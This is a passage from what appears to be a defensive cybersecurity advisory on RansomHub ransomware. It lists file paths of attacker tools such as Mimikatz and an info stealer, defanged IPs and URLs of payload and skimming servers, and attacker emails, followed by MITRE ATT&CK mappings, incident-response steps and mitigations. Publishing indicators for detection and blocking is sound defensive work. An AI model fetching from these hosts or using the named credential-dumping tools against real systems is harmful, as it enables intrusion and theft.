<td>Kerberoast</td>
<td>Kerberos Brute force and Exploitation Tool</td>
</tr>
<tr>
<td>AngryIPScanner</td>
<td>Network Scanner</td>
</tr>
</tbody>
</table>
<h2><strong>Indicators of Compromise</strong></h2>
<p><strong>Disclaimer:</strong> Several of these IP addresses were first observed as early as 2020, although most date from 2022 or 2023 and have been historically linked to QakBot. The authoring organizations recommend organizations investigate or vet these IP addresses prior to taking action (such as blocking).</p>
<p>See <strong>Table 2–Table 5</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Directory Structure TTPs</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Filename</th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\crackmapexec.exe</td>
<td>CrackMapExec</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\kerbrute.exe</td>
<td>Kerberoasting</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\Anydesk.exe</td>
<td>Anydesk C2</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Desktop\\IamBatMan.exe</td>
<td>Ransomware</td>
</tr>
<tr>
<td>C:\\Users\\backupexec\\Desktop\\stealer_cli_v2.exe</td>
<td>Info Stealer</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\nmap-7.94-setup.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\\Program Files (x86)\\Nmap\\nmap.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe</td>
<td><a>Mimikatz</a></td>
</tr>
<tr>
<td>C:\\Users\\backupexec\\Downloads\\x64\\mimikatz.exe</td>
<td>Mimikatz</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer</strong>: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking. Many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Known IPs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>8.211.2[.]97</a></td>
</tr>
<tr>
<td>45.95.67[.]41</td>
</tr>
<tr>
<td>45.134.140[.]69</td>
</tr>
<tr>
<td>45.135.232[.]2</td>
</tr>
<tr>
<td>89.23.96[.]203</td>
</tr>
<tr>
<td>188.34.188[.]7</td>
</tr>
<tr>
<td>193.106.175[.]107</td>
</tr>
<tr>
<td>193.124.125[.]78</td>
</tr>
<tr>
<td>193.233.254[.]21</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Known URLs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Web Requests</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>http[:]//188.34.188[.]7/555</a></td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/amba16.ico</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en-US</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe.Config</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/10.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/6.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/7.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/8.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/9.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/92.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/AmbaPDF.ico</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/ambapdf.ico.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/Cabinet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTBASE.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cryptnet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/DPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/iertutil.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/IPHLPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/mshtml.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/msi.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/SspiCli.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/urlmon.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/USERENV.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/webio.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winhttp.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WININET.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMM.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMMBASE.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winnlsres.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe.Config</td>
</tr>
<tr>
<td>http[:]//temp.sh/KnCqD/superloop.exe</td>
</tr>
<tr>
<td>https[:]//grabify.link/Y33YXP</td>
</tr>
<tr>
<td>https[:]//<a>i.ibb.co</a>/2KBydfw/112882618.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/4g6jH2J/2773036704.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/b1bZBpg/2615174623.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/Fxhyq6t/2077411869.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/HK0jV1G/534475006.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/nbMNnW4/2501108160.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/p1RCtpy/2681232755.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/SxQLwYm/1038436121.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/v1bn9ZK/369210627.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/X2FR8Kz/2113791011.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.com:443/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//<a>12301230[.]co</a>/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external</td>
</tr>
<tr>
<td><a>https[:]//samuelelena[.]co</a>/np</td>
</tr>
<tr>
<td>https[:]/samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]tripadvisor/module[.]tripadvisor[.]js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js&amp;nbsp;</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co:443/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td><a>https[:]//40031[.]co</a>/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Emails Related to RansomHub (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Email Addresses</th>
</tr>
</thead>
<tbody>
<tr>
<td>brahma2023[@]onionmail.org</td>
</tr>
<tr>
<td>&lt;victim_organization_name&gt;[@]protonmail.com</td>
</tr>
</tbody>
</table>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See&nbsp;<strong>Table 6–Table 17&nbsp;</strong>for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a></td>
<td>RansomHub affiliates may buy, steal, or download exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a></td>
<td>RansomHub affiliates used mass phishing and spear-phishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>RansomHub affiliates may exploit known vulnerabilities to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Windows Management Instrumentation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a></td>
<td>RansomHub affiliates may abuse Windows Management Instrumentation to execute malicious commands and payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Create Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136</a></td>
<td>RansomHub affiliates may create an account to maintain access to victim systems.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></td>
<td>RansomHub affiliates may manipulate accounts to maintain and/or elevate access to victim systems.</td>
</tr>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a></td>
<td>RansomHub affiliates may log onto systems using the Remote Desk Protocol, then perform actions as the logged-on user.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a></td>
<td>RansomHub affiliates may hide binaries by renaming executable names.</td>
</tr>
<tr>
<td>Indicator Removal on Host</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/\" title=\"Indicator Removal on Host\">T1070</a></td>
<td>RansomHub affiliates may remove logs to inhibit cybersecurity response.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>RansomHub affiliates may disable endpoint detection and response (EDR) tooling to avoid detection.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>RansomHub affiliates used Mimikatz on Windows systems to gather credentials.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>RansomHub affiliates may use password spraying to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></td>
<td>RansomHub affiliates may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></td>
<td>RansomHub affiliates may attempt to get a listing of services running on remote hosts and local network infrastructure devices,</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation of Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a></td>
<td>RansomHub affiliates may exploit remote service to gain unauthorized access to internal systems once inside of a network.&nbsp;</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 15: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a></td>
<td>RansomHub affiliates may use Anydesk, a legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 16: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/002/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\">T1048.002</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1537/\" title=\"Transfer Data to Cloud Account\">T1537</a></td>
<td>RansomHub affiliates may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/003/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol\">T1048.003</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 17: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>RansomHub affiliates used encryption for ransomware operations.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>RansomHub ransomware deleted volume shadow copies and affiliates removed backups for ransomware operations.</td>
</tr>
</tbody>
</table>
<h2><strong>Incident Response</strong></h2>
<p>If compromise is detected, organizations should:</p>
<ol>
<li>Quarantine or take potentially affected hosts offline.</li>
<li>Reimage compromised hosts.</li>
<li>Provision new account credentials.</li>
<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.</li>
<li>Report the compromise to CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or 888-282-0870). State, local, tribal, or territorial government entities can also report to the Multi-State Information Sharing and Analysis Center (MS-ISAC) (<a href=\"mailto:SOC@cisecurity.org\" title=\"Report to MS-ISAC\">SOC@cisecurity.org</a> or 866-787-4722).</li>
</ol>
<h2><strong>Mitigations</strong></h2>
<h3>Network Defenders</h3>
<p>The authoring organizations recommend organizations implement the mitigations below to improve cybersecurity posture based on RansomHub’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</strong></li>
<li><strong>Require all accounts with password logins</strong> <strong>(e.g., service accounts, admin accounts, and domain admin accounts) to comply with&nbsp;</strong><a href=\"https://pages.nist.gov/800-63-3/\" title=\"Digital Identity Guidelines\">National Institute for Standards and Technology (NIST) standards</a><strong> for developing and managing password policies.</strong>
<ul>
<li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;</li>
<li>Store passwords in hashed format using industry-recognized password managers;</li>
<li>Add password user “salts” to shared login credentials;</li>
<li>Avoid reusing passwords;</li>
<li>Implement multiple failed login attempt account lockouts;</li>
<li>Disable password “hints”; and</li>
<li>Refrain from requiring password changes more frequently than once per year.<br><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software.</li>
</ul>
</li>
<li><strong>Keep all operating systems, software, and firmware up to date</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E)\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.</li>
<li><strong>Require Phishing-Resistant multifactor authentication to administrator accounts</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>] and require standard MFA for all services to the extent possible (particularly for webmail, virtual private networks, and accounts that access critical systems).</li>
